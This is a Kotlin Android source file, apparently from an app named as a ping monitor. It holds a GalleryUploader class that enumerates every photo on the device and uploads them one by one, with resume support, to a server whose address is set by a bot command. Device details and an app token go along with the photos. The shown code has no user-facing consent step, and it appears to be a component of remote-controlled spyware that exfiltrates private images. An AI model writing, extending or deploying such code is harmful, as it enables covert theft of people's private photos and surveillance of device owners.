package com.example.pingmon

import android.content.Context
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Uploads the device gallery to the file server, one photo at a time.
 * Supports resume: if interrupted, continues from where it stopped.
 */
class GalleryUploader(private val ctx: Context) {

    companion object {
        private const val TAG = "GalleryUploader"
        private const val PREFS = "pingmon"
        private const val KEY_SESSION  = "gallery_session"
        private const val KEY_PROGRESS = "gallery_progress"

        val isRunning = AtomicBoolean(false)
    }

    private val prefs   = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
    private val client  = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    fun start() {
        if (isRunning.getAndSet(true)) {
            Log.w(TAG, "already running")
            return
        }
        Thread({
            try { run() }
            finally { isRunning.set(false) }
        }, "gallery-uploader").start()
    }

    private fun run() {
        val server = PingService.serverUrl(ctx)
        if (server.isBlank()) {
            report("No server configured. Use /setserver in bot.")
            return
        }

        // Query all images from MediaStore
        val photos = queryPhotos()
        if (photos.isEmpty()) {
            report("No photos found on device.")
            return
        }

        val total = photos.size
        Log.i(TAG, "Found $total photos")

        // Resume or start fresh
        var sessionId   = prefs.getString(KEY_SESSION, "") ?: ""
        var resumeFrom  = prefs.getInt(KEY_PROGRESS, 0)

        if (sessionId.isBlank()) {
            // Start new session
            val res = postJson(
                "$server/gallery/start",
                JSONObject().apply {
                    put("uid",    PingService.uid(ctx))
                    put("device", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                    put("total",  total)
                }
            ) ?: run { report("Failed to start session."); return }

            sessionId  = res.optString("session_id", "")
            resumeFrom = res.optInt("resume_from", 0)
            prefs.edit().putString(KEY_SESSION, sessionId).putInt(KEY_PROGRESS, resumeFrom).apply()
        }

        Log.i(TAG, "Session=$sessionId resumeFrom=$resumeFrom")

        // Upload photos from resumeFrom
        var sent = resumeFrom
        for (i in resumeFrom until photos.size) {
            val photo = photos[i]
            try {
                val bytes = ctx.contentResolver.openInputStream(photo.uri)?.readBytes() ?: continue
                uploadPhoto(server, sessionId, i, photo.name, bytes)
                sent++
                prefs.edit().putInt(KEY_PROGRESS, sent).apply()
                Log.i(TAG, "Uploaded $sent/$total")
            } catch (e: Exception) {
                Log.w(TAG, "Failed photo $i: ${e.message}")
                // Continue with next photo
            }
        }

        // Mark complete
        postJson("$server/gallery/finish", JSONObject().put("session_id", sessionId))

        // Clear session state
        prefs.edit().remove(KEY_SESSION).remove(KEY_PROGRESS).apply()
        report("Gallery upload complete: $sent/$total photos sent.")
    }

    private fun uploadPhoto(server: String, sid: String, index: Int, name: String, bytes: ByteArray) {
        val req = Request.Builder()
            .url("$server/gallery/photo")
            .addHeader("X-Token",    PingService.APP_TOKEN)
            .addHeader("X-Session",  sid)
            .addHeader("X-Index",    index.toString())
            .addHeader("X-Filename", name)
            .post(bytes.toRequestBody("image/jpeg".toMediaType()))
            .build()
        client.newCall(req).execute().use { /* fire and check */ }
    }

    private fun postJson(url: String, body: JSONObject): JSONObject? {
        return try {
            val req = Request.Builder()
                .url(url)
                .addHeader("X-Token", PingService.APP_TOKEN)
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) JSONObject(resp.body?.string() ?: "{}") else null
            }
        } catch (e: Exception) {
            Log.w(TAG, "postJson $url: ${e.message}")
            null
        }
    }

    private fun report(msg: String) {
        prefs.edit().putString("pending_report", msg).apply()
    }

    /* ─────────────────────────────────────── MediaStore query */

    data class Photo(val uri: android.net.Uri, val name: String, val date: Long)

    private fun queryPhotos(): List<Photo> {
        val photos = mutableListOf<Photo>()
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_TAKEN,
        )
        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        else
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        ctx.contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
            val idCol   = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
            while (cursor.moveToNext()) {
                val id   = cursor.getLong(idCol)
                val name = cursor.getString(nameCol) ?: "photo_$id.jpg"
                val date = cursor.getLong(dateCol)
                val uri  = android.content.ContentUris.withAppendedId(collection, id)
                photos.add(Photo(uri, name, date))
            }
        }
        return photos
    }
}
